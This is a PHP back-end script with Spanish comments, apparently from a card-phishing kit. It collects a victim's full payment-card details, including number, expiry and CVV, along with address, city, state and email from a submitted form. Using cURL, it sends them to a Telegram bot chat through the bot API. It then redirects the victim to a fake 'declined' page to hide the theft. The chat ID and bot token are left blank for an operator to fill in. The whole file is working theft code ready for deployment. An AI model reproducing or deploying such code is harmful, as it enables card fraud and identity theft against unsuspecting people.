<?php
// Variables para el chatId y el token del bot de Telegram
$chatId = '';
$tokenBot = '';

// Verifica si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene el valor del campo "cc_name" desde el formulario
    $cc_name = $_POST['cc_name'];
    $cc_number = $_POST['cc_number'];
    $_cc_expmonth = $_POST['_cc_expmonth'];
    $_cc_expyear = $_POST['_cc_expyear'];
    $cc_cvv2 = $_POST['cc_cvv2'];
    $cc_type = $_POST['cc_type'];
    $adress_name = $_POST['adress_name'];
    $cc_zip = $_POST['cc_zip'];
    $city_name = $_POST['city_name'];
    $number = $_POST['number'];
    $entidad = $_POST['entidad'];
    $mail = $_POST['mail'];

    // Concatenación del mensaje que quieres enviar a Telegram
    $mensaje = "Nombre: " . $cc_name . "\n";
    $mensaje .= "Tarjeta: " . $cc_number . "\n";
    $mensaje .= "Mes: " . $_cc_expmonth . "\n";
    $mensaje .= "Año: " . $_cc_expyear . "\n";
    $mensaje .= "Vencimiento: " . $cc_cvv2 . "\n";
    $mensaje .= "Tipo de cc: " . $cc_type . "\n";
    $mensaje .= "Domicilio: " . $adress_name . "\n";
    $mensaje .= "CP: " . $cc_zip . "\n";
    $mensaje .= "Ciudad: " . $city_name . "\n";
    $mensaje .= "Estado: " . $entidad . "\n";
    $mensaje .= "Correo: " . $mail;

    // URL de la API de Telegram para enviar mensajes
    $url = "https://api.telegram.org/bot$tokenBot/sendMessage";

    // Datos que se enviarán a Telegram (chat_id y el mensaje)
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje
    ];

    // Configura el POST usando cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecuta la solicitud y captura la respuesta
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirige a exito.php después de enviar el mensaje
    header("Location: declinado.html");
    exit(); // Asegura que el script se detenga después de la redirección
}
?>
